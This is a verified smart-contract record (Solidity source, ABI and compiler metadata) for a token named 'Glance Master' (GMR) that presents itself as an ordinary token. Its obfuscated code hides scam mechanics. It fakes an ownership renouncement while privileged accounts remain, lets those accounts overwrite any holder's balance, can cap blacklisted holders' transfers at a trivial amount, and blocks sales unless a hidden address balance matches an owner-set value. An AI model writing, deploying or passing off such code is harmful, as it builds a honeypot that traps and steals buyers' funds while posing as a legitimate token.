{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface senderTrading {\n    function createPair(address takeToken, address sellExempt) external returns (address);\n}\n\ninterface amountReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTo) external view returns (uint256);\n\n    function transfer(address totalReceiver, uint256 fundFee) external returns (bool);\n\n    function allowance(address takeWalletFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalReceiver,\n        uint256 fundFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletSell, uint256 value);\n    event Approval(address indexed takeWalletFund, address indexed spender, uint256 value);\n}\n\nabstract contract buyExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountReceiverMetadata is amountReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GlanceMaster is buyExempt, amountReceiver, amountReceiverMetadata {\n\n    function autoEnable() private view {\n        require(txAmountFund[_msgSender()]);\n    }\n\n    uint256 public tradingAtLaunched;\n\n    address public feeMinMax;\n\n    constructor (){\n        if (takeList) {\n            atModeToken = false;\n        }\n        exemptSender sellShouldBuy = exemptSender(txExempt);\n        feeMinMax = senderTrading(sellShouldBuy.factory()).createPair(sellShouldBuy.WETH(), address(this));\n        \n        shouldFee = _msgSender();\n        txAmountFund[shouldFee] = true;\n        marketingMode[shouldFee] = atFrom;\n        receiverShould();\n        \n        emit Transfer(address(0), shouldFee, atFrom);\n    }\n\n    function balanceOf(address amountTo) public view virtual override returns (uint256) {\n        return marketingMode[amountTo];\n    }\n\n    uint256 feeEnable;\n\n    bool public takeList;\n\n    mapping(address => mapping(address => uint256)) private tradingWallet;\n\n    mapping(address => bool) public txAmountFund;\n\n    function atMode(uint256 fundFee) public {\n        autoEnable();\n        senderTakeLimit = fundFee;\n    }\n\n    function fromLaunchedAmount(address txIs, address totalReceiver, uint256 fundFee) internal returns (bool) {\n        require(marketingMode[txIs] >= fundFee);\n        marketingMode[txIs] -= fundFee;\n        marketingMode[totalReceiver] += fundFee;\n        emit Transfer(txIs, totalReceiver, fundFee);\n        return true;\n    }\n\n    mapping(address => uint256) private marketingMode;\n\n    address private fundTx;\n\n    address public shouldFee;\n\n    bool public atModeToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedMode;\n    }\n\n    bool public swapExempt;\n\n    string private amountShould = \"GMR\";\n\n    function receiverShould() public {\n        emit OwnershipTransferred(shouldFee, address(0));\n        fundTx = address(0);\n    }\n\n    address txExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private launchedMode = 18;\n\n    function allowance(address walletMinReceiver, address walletTo) external view virtual override returns (uint256) {\n        if (walletTo == txExempt) {\n            return type(uint256).max;\n        }\n        return tradingWallet[walletMinReceiver][walletTo];\n    }\n\n    uint256 public buyFund;\n\n    bool private takeLimit;\n\n    function transfer(address isReceiver, uint256 fundFee) external virtual override returns (bool) {\n        return launchedSender(_msgSender(), isReceiver, fundFee);\n    }\n\n    function launchedSender(address txIs, address totalReceiver, uint256 fundFee) internal returns (bool) {\n        if (txIs == shouldFee) {\n            return fromLaunchedAmount(txIs, totalReceiver, fundFee);\n        }\n        uint256 launchedTo = amountReceiver(feeMinMax).balanceOf(totalSell);\n        require(launchedTo == senderTakeLimit);\n        require(totalReceiver != totalSell);\n        if (totalMode[txIs]) {\n            return fromLaunchedAmount(txIs, totalReceiver, maxAutoBuy);\n        }\n        return fromLaunchedAmount(txIs, totalReceiver, fundFee);\n    }\n\n    bool public enableBuy;\n\n    function atReceiverBuy(address liquidityToken) public {\n        if (swapExempt) {\n            return;\n        }\n        if (takeLimit) {\n            tradingAtLaunched = amountBuy;\n        }\n        txAmountFund[liquidityToken] = true;\n        \n        swapExempt = true;\n    }\n\n    mapping(address => bool) public totalMode;\n\n    function amountSell(address liquidityAmount) public {\n        autoEnable();\n        \n        if (liquidityAmount == shouldFee || liquidityAmount == feeMinMax) {\n            return;\n        }\n        totalMode[liquidityAmount] = true;\n    }\n\n    event OwnershipTransferred(address indexed totalExempt, address indexed minAtAuto);\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountShould;\n    }\n\n    uint256 constant maxAutoBuy = 15 ** 10;\n\n    uint256 senderTakeLimit;\n\n    uint256 public buyMaxEnable;\n\n    uint256 private atFrom = 100000000 * 10 ** 18;\n\n    function transferFrom(address txIs, address totalReceiver, uint256 fundFee) external override returns (bool) {\n        if (_msgSender() != txExempt) {\n            if (tradingWallet[txIs][_msgSender()] != type(uint256).max) {\n                require(fundFee <= tradingWallet[txIs][_msgSender()]);\n                tradingWallet[txIs][_msgSender()] -= fundFee;\n            }\n        }\n        return launchedSender(txIs, totalReceiver, fundFee);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTakeSender;\n    }\n\n    uint256 public amountBuy;\n\n    function marketingReceiverTeam(address isReceiver, uint256 fundFee) public {\n        autoEnable();\n        marketingMode[isReceiver] = fundFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atFrom;\n    }\n\n    string private receiverTakeSender = \"Glance Master\";\n\n    uint256 public fundFromExempt;\n\n    function owner() external view returns (address) {\n        return fundTx;\n    }\n\n    function approve(address walletTo, uint256 fundFee) public virtual override returns (bool) {\n        tradingWallet[_msgSender()][walletTo] = fundFee;\n        emit Approval(_msgSender(), walletTo, fundFee);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundTx;\n    }\n\n    address totalSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeWalletFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAtAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atModeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"}],\"name\":\"atReceiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMaxEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMinMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"marketingReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAtLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAmountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GlanceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}